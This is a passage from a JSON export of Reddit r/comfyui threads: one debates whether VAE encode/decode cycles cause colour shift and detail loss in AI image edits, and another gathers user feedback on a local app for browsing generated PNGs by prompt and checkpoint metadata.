                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qkog35",
      "title": "Colour shift is not caused by the VAE",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/0lhl6roc43fg1.png",
      "author": "Luke2642",
      "created_utc": "2026-01-23 11:33:33",
      "score": 127,
      "num_comments": 59,
      "upvote_ratio": 0.94,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkog35/colour_shift_is_not_caused_by_the_vae/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o18mt0i",
          "author": "afinalsin",
          "text": ">If you pass it through six times you get a slight fading effect, that is all\n\nNo, that is not all. The VAE will degrade the details of the image. Below is a bunch of comparisons between input image and 8x trips through a VAE encode/decode cycle (scroll to zoom in):\n\n[Here is a robot](https://imgsli.com/NDQ0NjY3).\n\n[Here is an anime creature.](https://imgsli.com/NDQ0NjY4)\n\n[Here is a random demon woman](https://imgsli.com/NDQ0Njcy).\n\n[Here is a Fernando Alonso](https://imgsli.com/NDQ0Njcx).\n\n[Here is a lower resolution Fernando Alonso](https://imgsli.com/NDQ0Njgy).\n\nYour methodology isn't great because you are running a single 1080 x 1935 image through the VAE so the loss of detail is much less noticeable. When you run a 1 megapixel image through the same process (like you would with image editing, for example) the degradation is much more apparent. Even if the the colors remain basically the same, the destruction of details is too much to be dismissed as a \"slight fading effect\". \n\n---\n\n>It's some sort of groupthink, when no-one actually tested it.\n\nOkay, let's test it. I'll create an image from two inputs, and run 8 edits on consecutive outputs. \n\n[Here](https://i.postimg.cc/dJvcwHqW/grid-00027.png) I make all edits directly with latents, so it was only one encode/decode cycle. 0 Degradation.\n\n[Here](https://i.postimg.cc/R472s7cq/grid-00028.png) I make all edits with images in an encode/decode cycle, changing the seed each prompt. Nothing super noticeable, if at all. There might be if I had static elements that are supposed to remain untouched by the model. Test that next.\n\n[Here](https://i.postimg.cc/dwYxyhz0/grid-00029.png) I make all edits with images in an encode/decode cycle and keep the seed static. There are tons of errors, and they compound from one gen to the next. The wings and midsection are the most noticeable, but there are errors all over the place. So, I can confidently say leaving the seed static from gen to gen will fuck up your image. Now lets test that VAE cycle.\n\n---\n\n[Here](https://i.postimg.cc/rcC97QPW/vae-00001.png) is a run of edits using the VAE.\n\n[Here](https://i.postimg.cc/tytz82M6/vaeless-00001.png) is a run of edits using only latents.\n\nBoth of these runs are the exact same seed, exact same prompts. The differences are subtle, but the result is clear. [Here is the final output](https://imgsli.com/NDQ0NzAw). \n\nCompare the detail on the house and the tree above it on the mug. Every edit had a clear instruction: \"Leave the coffee mug exactly as it is.\" And it did, but the VAE got in the way and degraded the details.\n\nSo yeah, it was some sort of \"groupthink\", but the group was thinking based on knowledge gained over years of doing this. The color degradation was likely based on an unchanging seed, but passing into and out of latent space will still fuck up your image so it's best to avoid it as much as possible. \n\nEven a VAE as good as the Flux2 Vae will fuck up your image with enough cycles, because the tiny mistakes compound with each other. If I ran that mug through ten more edits the results would be even more stark. That's also why you mask when you inpaint, otherwise your final result ends up like mud.",
          "score": 31,
          "created_utc": "2026-01-23 14:03:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18o6fq",
              "author": "Luke2642",
              "text": "You make some good points, but I have no idea what your workflow is for each of those edit images or what you're trying to prove. There is a slight quality/detail loss each you encode/decode with the VAE, I never said there wasn't.\n\nThe OP was doing 3 edits and seeing colour shift on that exact image. The colour shift was not caused by the VAE, as demonstrated.",
              "score": 5,
              "created_utc": "2026-01-23 14:10:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18rwcv",
                  "author": "afinalsin",
                  "text": "Just reread that thread, and we both overlooked something very simple: \n\n>\"I am using the default workflow. Just removed the \"ImageScaleToTotalPixels\" node to keep the output reso same as input.\"\n\nThe input resolution of OP's image is 1536 x 2752. Homie was trying to gen 2x base resolution. \n\nEven with that full resolution, [I couldn't replicate the errors](https://i.postimg.cc/WsgrJ7Jt/Comfy-UI-0003.webp). The image deteriorated, as to be expected, but the color wasn't one of them, so I'm stumped.\n\nEdit to answer edit:\n\n>what you're trying to prove\n\nJust countering your statement that \"you only get a slight fading\". \n\n>There is a slight quality/detail loss each you encode/decode with the VAE, I never said there wasn't.\n\nI see now that you were referring strictly to color, but that statement can easily be read as the fading being the only detrimental effect at being passed in and out of the VAE. My reading of that made it seem like you did indeed say there wasn't a quality/detail loss, which is what I was countering. My bad. On a completely related note, I hate English. \n\nStill, if someone reads this and gets something out of it, job done, I don't mind arguing against a point I've misinterpreted.",
                  "score": 7,
                  "created_utc": "2026-01-23 14:29:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o180u4y",
          "author": "Most_Way_9754",
          "text": "Can you explain why the laten multiply removes the fade? Should we include this after the vae decode on a regular generation?",
          "score": 11,
          "created_utc": "2026-01-23 11:48:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "o183x1o",
              "author": "Luke2642",
              "text": "There must be something in the encode/decode that is squashing the weights or pixel values slightly each time, or, it could be a cumulative rounding error, but that seems unlikely. Latent space geometry is hard to conceptualise, but I guess that the absolute magnitudes somehow control the overall contrast, and the relative magnitudes control the features.\n\nIf you want to boost the contrast, yeah, multiply is a quick and dirty way to do it?",
              "score": 8,
              "created_utc": "2026-01-23 12:10:49",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o190kqt",
                  "author": "RickyRickC137",
                  "text": "Is there a cleaner way, then?\n\nAlso, does it work with qwen edit?",
                  "score": 1,
                  "created_utc": "2026-01-23 15:12:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o183kqt",
              "author": "Character-Bend9403",
              "text": "I wanna know aswell i am a beginner and would love to know  the answer to this , if you feel explaining it.",
              "score": 1,
              "created_utc": "2026-01-23 12:08:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o18ilex",
          "author": "Justify_87",
          "text": "https://github.com/Jelosus2/comfyui-vae-reflection\n\n\nThis may be interesting for you",
          "score": 10,
          "created_utc": "2026-01-23 13:41:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18pg1u",
              "author": "Luke2642",
              "text": "That is very interesting to me, thank you!",
              "score": 1,
              "created_utc": "2026-01-23 14:17:01",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1ibubl",
              "author": "Nexustar",
              "text": "I thought i was looking at a Rothko at first.",
              "score": 1,
              "created_utc": "2026-01-24 22:18:45",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o184lpz",
          "author": "infearia",
          "text": "I don't claim to understand fully what you're talking about, but it seems you're onto something. There are times I notice a HUGE increase in brightness after only ONE single edit operation. Maybe you could open an issue or a discussion on ComfyUI's official GitHub repo?",
          "score": 6,
          "created_utc": "2026-01-23 12:15:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o187wbo",
          "author": "TBG______",
          "text": "Pixel space ranges from 0 to 255, while latent space is normalized to 0‚Äì1 float32 in best cases and compressed by a factor of 8. Rounding errors are common, but they do not cause image saturation like in these examples.\n\nSure, I didn‚Äôt test this with Flux 2, but it looks like the Flux model tends to add a bit more saturation to the input image on each pass. My suspicion is that Flux has a built-in corrector that works ‚Äúwell‚Äù on the first pass but then accumulates over subsequent passes. The problem is that it seems to be applied only to unchanged areas, so ideally your correction pass should also target only those areas.\n\nHave you tried whether the same behavior happens with img2img without inpainting? Did you keep the same seed on each pass, or did you change it? In any case, it‚Äôs usually best to do your generation first, then crop and stitch the original background back into the image using the same mask, and only then proceed with the next pass.",
          "score": 3,
          "created_utc": "2026-01-23 12:38:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18bigi",
              "author": "TheSquirrelly",
              "text": "SwarmUI has some color correction options when using flux inpainting.  I wonder if it's a similar issue at all.  Though it looks like it applies this through a custom \"SwarmImageCompositeMaskedColorCorrecting\" node.\n\nhttps://preview.redd.it/ld6ri81rj3fg1.png?width=1229&format=png&auto=webp&s=2dbcc1be2748357a97259927089c74c88bf90f8c",
              "score": 1,
              "created_utc": "2026-01-23 13:00:51",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18s54n",
              "author": "Formal-Exam-8767",
              "text": "> while latent space is normalized to 0‚Äì1 float32\n\nAre you sure? I thought latent tensor values are unbound, with approximately zero‚Äëmean.",
              "score": 1,
              "created_utc": "2026-01-23 14:30:47",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1azkx7",
              "author": "Geekn4sty",
              "text": "Isn't the latent tensor autocast as the same dtype of the model weights? They must undergo matrix multiplication in the forward pass, I'm pretty sure torch will not allow them to have mismatched precision.",
              "score": 1,
              "created_utc": "2026-01-23 20:38:00",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ecllm",
                  "author": "TBG______",
                  "text": "That‚Äôs correct. \n\n* **Latent ‚Üí pixel conversion happens** ***after*** **decoding via the VAE**\n* The VAE decoder output is:\n   * float (usually fp16/fp32)\n   * then clamped / scaled to `[0,1]`\n   * *then* converted to 8-bit (0‚Äì255) for images (bottleneck)",
                  "score": 1,
                  "created_utc": "2026-01-24 09:11:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o184q4b",
          "author": "Minimum-Let5766",
          "text": "When inpainting flux1.dev, I get color fading in the final image of the non-masked area .  But the masked area which was manipulated remains at original saturation, so it never looks quite right.  Hopefully this latent multiply can help.",
          "score": 2,
          "created_utc": "2026-01-23 12:16:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18ge1r",
          "author": "ReasonablePossum_",
          "text": "Tried with the latentmultiply at 2, it gives me an oversaturated and degraded output\n\nhttps://preview.redd.it/0emk7lnmp3fg1.png?width=293&format=png&auto=webp&s=4de3a2264f64303ab542ea289274a7ccf70f5bbc",
          "score": 2,
          "created_utc": "2026-01-23 13:29:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18qg1m",
              "author": "TBG______",
              "text": "If you multiply 0.2% of any color by 2, you simply get 0.4%. That‚Äôs just post-processing, not an actual solution.",
              "score": 2,
              "created_utc": "2026-01-23 14:22:07",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18ix6a",
              "author": "Luke2642",
              "text": "I have no idea what your workflow is. Are simply replicating encode-decode 6 times for fun?",
              "score": 1,
              "created_utc": "2026-01-23 13:42:57",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o18oorc",
              "author": "Cute_Ad8981",
              "text": "It depends on the vae. For example I had to use 0.75 with the latent multiply for wan 2.2 5b. OP is using 2.0 after 3-4 encodings/decodings. maybe test 1.25 or 0.75 and adjust.",
              "score": 1,
              "created_utc": "2026-01-23 14:13:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18sy7i",
              "author": "Formal-Exam-8767",
              "text": "That's expected since it's a hack. There is no semantic explanation what multiplying every value by 2 in latent space means.",
              "score": 1,
              "created_utc": "2026-01-23 14:34:57",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o18jctv",
          "author": "pwillia7",
          "text": "This guy diffuses",
          "score": 2,
          "created_utc": "2026-01-23 13:45:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18p8oq",
              "author": "Luke2642",
              "text": "Technically this is just encoding and decoding üòú",
              "score": 1,
              "created_utc": "2026-01-23 14:15:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18pbu4",
                  "author": "pwillia7",
                  "text": "ha -- fair play",
                  "score": 1,
                  "created_utc": "2026-01-23 14:16:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fqush",
          "author": "Clasyc",
          "text": "Commenting not specifically to OP, but with some general points for other commenters. I see a lot of people missing a key piece of information when talking about moving forward with VAEs.\n\nLatent ‚Üí Image (VAE Decode) is a deterministic operation and does not lose information relative to the latent. Image ‚Üí Latent (VAE Encode) is a lossy operation.\n\nSo it‚Äôs kinda obvious that if you repeatedly chain multiple VAE encode + VAE decode operations, you will eventually lose more and more information. At the same time, you start ‚Äúsaturating‚Äù specific patterns that the VAE is good at resolving and encoding. As a result, overall quality degrades, and the image becomes more and more sharp, contrasty, and ‚ÄúAI-looking‚Äù in the end.\n\nIt doesn‚Äôt matter what tricks you do between those operations - once you keep re-encoding, you are inevitably losing original information.",
          "score": 2,
          "created_utc": "2026-01-24 15:16:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18564l",
          "author": "ANR2ME",
          "text": "Nice finding üëç\n\nDo we need lower multiplier value if it was for the 2nd image? ü§î since 2.0 is for the 3rd image, which already faded twice.",
          "score": 1,
          "created_utc": "2026-01-23 12:19:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o185e05",
          "author": "Formal-Exam-8767",
          "text": "Do VAE encode, modify part of the image (while in latent space), do VAE decode, whole image tone changes/shifts.",
          "score": 1,
          "created_utc": "2026-01-23 12:21:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o185tzr",
              "author": "Luke2642",
              "text": "You're confusing local and global features in the latent space. I mentioned in the other post that latent geometry is complex!",
              "score": 1,
              "created_utc": "2026-01-23 12:24:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18bmej",
                  "author": "Formal-Exam-8767",
                  "text": "Yes, and you can't replicate color tone shift without changing the image in latent space. Same thing happens with tiled VAE decode.",
                  "score": 1,
                  "created_utc": "2026-01-23 13:01:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o187m7i",
          "author": "TidalFoams",
          "text": "I've always thought about it like the ksampler is making a copy of a very slightly altered copy (like a game of telephone). Any problems it introduces (color change in this case) get amplified in the next pass. It's not just the color that changes but subtle detail gets lost over iterations through a ksampler. If you do it enough times you get monster people.",
          "score": 1,
          "created_utc": "2026-01-23 12:36:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18biw5",
          "author": "Cute_Ad8981",
          "text": "Your post is interesting, because I'm searching for an easy solution for that problem.  \nI'm using latent multiply too and it helped, but are you sure this is fully lossless and can be applied to all different vaes (wan for example)? I often chained multiple samplers for video extension and it was pretty hard to pinpoint the exact value for latent multiply.",
          "score": 1,
          "created_utc": "2026-01-23 13:00:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1bw9c4",
              "author": "physalisx",
              "text": "It is absolutely not and OP is completely wrong. VAE encode/decode will absolutely degrade your image, there is no \"lossless\" way around that.",
              "score": 2,
              "created_utc": "2026-01-23 23:16:38",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18jdiz",
              "author": "Luke2642",
              "text": "It's going to be trial and error.\n\nComfyUI will auto-detect the model type in the ksampler and apply the correct latent space scale and shift before doing the model denoising, then rescale and shift it afterwards. So there's lots of opportunity for shifts to creep in.",
              "score": 1,
              "created_utc": "2026-01-23 13:45:23",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18o17i",
                  "author": "ZenEngineer",
                  "text": "I wonder if there's some way to test that. What happens if you run a few steps with 0 denoise? Would ksampler still scale and shift?",
                  "score": 1,
                  "created_utc": "2026-01-23 14:09:49",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1a43jo",
          "author": "Spare_Ad2741",
          "text": "would same methodology apply to video creation also?",
          "score": 1,
          "created_utc": "2026-01-23 18:12:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1agx3k",
          "author": "Simple-Variation5456",
          "text": "its crazy to see what people come up with, struggle with and take minutes to correct and edit in their workflows while oldboi photoshop just did it better 20 years ago.  \nI generate in comfyui (or directly in photoshop with firefly fill / flux / nano) and copy the output into photoshop as a layer, can copy already made masks and can refine and edit everything on seperate layers whenever i want.  \nHow you even precisely pick a color for certain things?  \nCan you even mask stuff above 4-8k?  \n  \nDo people actually edit their outputs over and over?  \nI'm already getting mad when NanoPro/Flux2Pro/Seedream 4.5 just slightly change the image even tho telling or masking areas to keep and only change x.  \nThis sounds worse than people had to cut out stuff and glue them together physically (analog) before photoshop was a thing.",
          "score": 1,
          "created_utc": "2026-01-23 19:10:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1bh215",
          "author": "MidSolo",
          "text": "Could you have made it any more difficult to figure out what is going on in your workflow?",
          "score": 1,
          "created_utc": "2026-01-23 21:59:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1biv7d",
              "author": "Luke2642",
              "text": "Load image\nEncode\nDecode\nEncode\nDecode\nEncode\nDecode\nPreview\nEncode\nDecode\nEncode\nDecode\nEncode\nDecode\nPreview¬†",
              "score": 1,
              "created_utc": "2026-01-23 22:08:28",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1xfi06",
                  "author": "Far_Buyer_7281",
                  "text": "oi if you say it like that, could you do it again witht he image first scaled to 1 megapixel?",
                  "score": 1,
                  "created_utc": "2026-01-27 00:44:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1bpd94",
          "author": "superstarbootlegs",
          "text": "VAE will degrade your images coming out of Latent Space though. You do it enough (put it through another wf) and still apply color shift you will have very shit results which is why color shift alone is not enough to solve it.\n\nOr has something new been involved to resolve that because last year it was the bane of extending WAN based workflow results. Trying to swap multiple characters out with VACE got nasty and would require compositing to resolve mostly due to passing in and out of Latent Space from the VAE encode decode.\n\nMaybe I misunderstood what you are trying to show here. (I work mostly in video which is where I see this issue).",
          "score": 1,
          "created_utc": "2026-01-23 22:40:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1bqn0p",
              "author": "Luke2642",
              "text": "Yes, small loss of detail each time. I was showing that the vae doesn't damage the latent much, even 6 encodes 6 decodes. The ksampler damages it a lot more, and causes colour shift.",
              "score": 1,
              "created_utc": "2026-01-23 22:47:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1cj07c",
                  "author": "superstarbootlegs",
                  "text": "isnt that its job - making pixels.",
                  "score": 1,
                  "created_utc": "2026-01-24 01:20:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1brsdn",
          "author": "YMIR_THE_FROSTY",
          "text": "Colors are defined by matrix thats in some ComfyUI file, bit lazy to find it, so ask AI.",
          "score": 1,
          "created_utc": "2026-01-23 22:53:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1c5gy4",
          "author": "Several_Honeydew_250",
          "text": "Anytime you pass to latent space and back, you lose quality.  This is why if your not shift your model class (XL/PONY/FLUX/KRAE etc..) leave it in LATENT, don't decode until the end.  Also, you're using the same VAE on all of them... so, it should maintain color space.",
          "score": 1,
          "created_utc": "2026-01-24 00:06:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ej5fx",
          "author": "TBG______",
          "text": "https://preview.redd.it/150m7twbs9fg1.png?width=379&format=png&auto=webp&s=8c49da4c2aae3e221801fd845fa6cd82c21b32a3\n\nThis is a difference overlay showing all the changes made by the edit sampling with the prompt: *‚Äúchange the color of the shirt to black, keep the background as is.‚Äù* Flux2 Klein 9B tends to alter everything in the image, which is typical behavior and not unique to Flux2 Klein.\n\nAfter observing the results, the changes made by the model are not what I would expect in a real-world scenario. For instance, if a large portion of the image is occupied by a person wearing a white T-shirt and you change it to black, the overall color balance of the image shifts. Reflections, lighting, and even the camera‚Äôs exposure or white balance adapt to the new mid-gray of the scene.   As example looking at the arm, the upper part should show a different light reflection, but it doesn‚Äôt. For me, that means using masking along with a low-percentage blend of the unmasked areas could be sufficient.",
          "score": 1,
          "created_utc": "2026-01-24 10:12:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1eltbb",
              "author": "TBG______",
              "text": "This is after a straightforward fix\n\nhttps://preview.redd.it/7864o8wlz9fg1.png?width=373&format=png&auto=webp&s=049a7892e898d8d119adb38f49b17b338aa52f73\n\nwill post wf later",
              "score": 1,
              "created_utc": "2026-01-24 10:37:02",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ema1k",
                  "author": "TBG______",
                  "text": "https://preview.redd.it/x4v68k210afg1.png?width=1634&format=png&auto=webp&s=35bb23d10d6dc113c749fe22bc948a5306fe8248\n\nUse Sam to select the element, then expand and blur the mask, apply compositing with the mask and unmasked area, and if you like blend old over new as an optional intermediate solution.",
                  "score": 1,
                  "created_utc": "2026-01-24 10:41:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1f292l",
              "author": "TBG______",
              "text": "https://preview.redd.it/1y5gvizmgafg1.png?width=1433&format=png&auto=webp&s=c0688fe805d0c9b2ba7c43a8de06970bab26907b\n\nAfter testing it with SAM, which requires manual input of elements, I‚Äôve created a new node that can automatically detect the affected areas without SAM, allowing the process to be fully automated.\n\nHowever, I noticed that many contour edges are affected by the mode changes, even with slight repositioning of the edges. This could make the issue a bit tricky to resolve. I will uplode the node to the TBG Takeaways : The TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and compression noise. \n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here: [https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920) (free access).",
              "score": 1,
              "created_utc": "2026-01-24 12:53:31",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1k7uq0",
          "author": "Capitan01R-",
          "text": "Interesting I was working on the same thing just yesterday bc I knew I was not seeing things, I created a quick node to adjust the decoder and i gotten better colors but since it was manual control it was difficult to choose which works best, and this seems interesting!",
          "score": 1,
          "created_utc": "2026-01-25 04:29:18",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qmq2l0",
      "title": "Built a local browser to organize my 60k+ PNG chaos ‚Äî search by checkpoint, prompt, LoRA, seed etc.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qmq2l0",
      "author": "SunTzuManyPuppies",
      "created_utc": "2026-01-25 17:53:46",
      "score": 109,
      "num_comments": 23,
      "upvote_ratio": 0.96,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qmq2l0/built_a_local_browser_to_organize_my_60k_png/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1oieul",
          "author": "AK_3D",
          "text": "Thanks for the app. I was just checking it out, it's pretty fast. It does not read WebP workflows however, even when saved with the prompt saver node. (Diffusion Toolkit, which is a similar app does this).",
          "score": 4,
          "created_utc": "2026-01-25 20:00:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1opnrl",
              "author": "SunTzuManyPuppies",
              "text": "Hey, appreciate the feedback and glad its feeling fast on your end. Yea you caught a blind spot there.. oops. I just recently implemented the Save Node and im still sorting out how it handles some metadata chunks specifically for WebP. Its a high priority tho and ill have a fix out in the next release (likely in the next few days) to get it on par with png. Thanks for the heads up!",
              "score": 5,
              "created_utc": "2026-01-25 20:32:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1oq82a",
                  "author": "AK_3D",
                  "text": "Happy to provide feedback via a ticket. Overall, its' very straightforward. Also tested it on a slightly older PC. Works great.  \nRather than make an entirely new node, might be better to use the ComfyUI SD Prompt Saver node, which embeds the metadata in a WebP or PNG.",
                  "score": 2,
                  "created_utc": "2026-01-25 20:35:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1q5z8j",
              "author": "SunTzuManyPuppies",
              "text": "Hey there! \n\nI just made some tests and the app appears to be reading WebP normally.\n\nhttps://preview.redd.it/gl225fl58lfg1.png?width=785&format=png&auto=webp&s=4a083891934a4b248ef4efa1c100a660097cc733\n\nIf you have the time, could you please send me the workflow of one of your WebP images that the app isn't reading? \n\nIt would be really helpful! Tks",
              "score": 2,
              "created_utc": "2026-01-26 00:29:07",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1q6e56",
                  "author": "SunTzuManyPuppies",
                  "text": "Actually... I think I found the culprit: it's likely a race condition.\n\nThe app tries to read the metadata the exact millisecond the file is created. If ComfyUI or the OS hasn't finished flushing the metadata chunk to disk yet, the parser sees it as empty/incomplete. That explains why the metadata is there when checking manually later but fails during the initial auto-indexing.\n\nIm adding a retry/debounce mechanism to ensure the file is fully written before parsing. Thanks again!",
                  "score": 3,
                  "created_utc": "2026-01-26 00:31:07",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "o1t40bi",
                  "author": "AK_3D",
                  "text": "Happy to send you an image with a webp workflow, one with prompt saver and one without. Will do this once I'm at my desktop later.",
                  "score": 1,
                  "created_utc": "2026-01-26 12:39:30",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ofxkp",
          "author": "NickoMagnum",
          "text": "Very interesting",
          "score": 3,
          "created_utc": "2026-01-25 19:49:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ohhtd",
              "author": "SunTzuManyPuppies",
              "text": "Thanks!",
              "score": 2,
              "created_utc": "2026-01-25 19:56:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1pgb3z",
          "author": "buddylee00700",
          "text": "I use https://immich.app/\n\nHas AI already built in so you can describe what are searching for if your library gets absolutely massive. I really haven‚Äôt played around with it much to see how accurate it is but it‚Äôs pretty slick for free and open source.\n\nProbably not as focused as yours though",
          "score": 2,
          "created_utc": "2026-01-25 22:28:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1plbwu",
              "author": "SunTzuManyPuppies",
              "text": "Immich is a great tool! Another really cool one that has semantic search is PhotomapAI by lstein (InvokeAI dev). You should check it out! \n\nIMH tackles the same problem from a different angle. I thought about adding semantic search, but figured I'd keep it \"light-weight\" as it is for now... Perhaps in the future. \n\nCheers",
              "score": 3,
              "created_utc": "2026-01-25 22:51:32",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1u079u",
          "author": "Lil_Twist",
          "text": "Perfect, thanks buddy! Happy to support and buy your Pro Version, and contribute.",
          "score": 2,
          "created_utc": "2026-01-26 15:29:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1y18ou",
              "author": "SunTzuManyPuppies",
              "text": "Thanks man, it really means a lot!!",
              "score": 1,
              "created_utc": "2026-01-27 02:42:22",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1ywbmg",
                  "author": "Lil_Twist",
                  "text": "You should see the things I did for like the last 14 hours to enhance your build. \n\nDM me and we can connect on discord too.",
                  "score": 1,
                  "created_utc": "2026-01-27 05:58:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1uafv3",
          "author": "Street-Pain-9808",
          "text": "Love the app, can't recommend it more.",
          "score": 2,
          "created_utc": "2026-01-26 16:14:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1uwdc7",
          "author": "Yattagor",
          "text": "Interesting, definitely very useful. As soon as I read \"the mess in the output folder,\" I thought to myself!",
          "score": 2,
          "created_utc": "2026-01-26 17:49:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vtj9k",
          "author": "WiseDuck",
          "text": "Tried it briefly earlier today. Wish I had something like this a long time ago. Brilliant!",
          "score": 2,
          "created_utc": "2026-01-26 20:10:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1x0z2r",
              "author": "SunTzuManyPuppies",
              "text": "Nice!! I hope its useful to you as much as it is to me!",
              "score": 1,
              "created_utc": "2026-01-26 23:30:01",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1xb3qn",
          "author": "According_Boat_6928",
          "text": "Looks cool but the arm64 dmg gives me a ‚ÄúImage MetaHub.app‚Äù is damaged and can‚Äôt be opened. You should move it to the Trash.\" error when I try to launch the app. I'm running MacOS Tahoe 26.2",
          "score": 2,
          "created_utc": "2026-01-27 00:21:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1pcl4e",
          "author": "Woisek",
          "text": "Looks interesting, but somehow it's a bit slow for me. And what I noticed immediately: When we select the sorting option, it would make sense that the folders get sorted in that way too.\n\nThanks for the work. üëç\n\nUpdate: When using the arrow key to scroll through the images, the thumbnail animation is chosen unlucky. Either use no animation at all, or just a slight fade. This \"quick grow\" is somehow irritating to look at.",
          "score": 0,
          "created_utc": "2026-01-25 22:12:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1q4q96",
              "author": "SunTzuManyPuppies",
              "text": "Hey there! Thanks for the feedback. Regarding the 'animation', its actually a performance feature rather than an intentional effect. To keep navigation fast, the app loads the low-res thumbnail first so you can scroll through thousands of images without waiting for the full files to decode. Once the high-res image is ready, it swaps it in. That 'quick grow' you're seeing is that transition to full resolution. Im looking into other performance solutions so that no longer happens. Meanwhile ill consider adding an option to toggle progressive loading until i find a fix!\n\nAbout the speed, the app is built to be snappy even with massive collections (have users testing it with 120k+ images successfully), so if its feeling slow it might be a bottleneck with I/O or the drive where the images are stored. Are you using an SSD, NVME or HDD?",
              "score": 1,
              "created_utc": "2026-01-26 00:22:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1sxtj4",
                  "author": "Woisek",
                  "text": ">the app loads the low-res thumbnail first\n\nIn that case, maybe the low-res file should be scaled to the same size as the full res, then this \"scale-flicker\" wouldn't appear.\n\nAre you using an SSD, NVME or HDD?\n\nI use HDD, but that's not the issue. I think it's more the scanning and the multiple folders to go through.",
                  "score": 1,
                  "created_utc": "2026-01-26 11:54:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qlhta9",
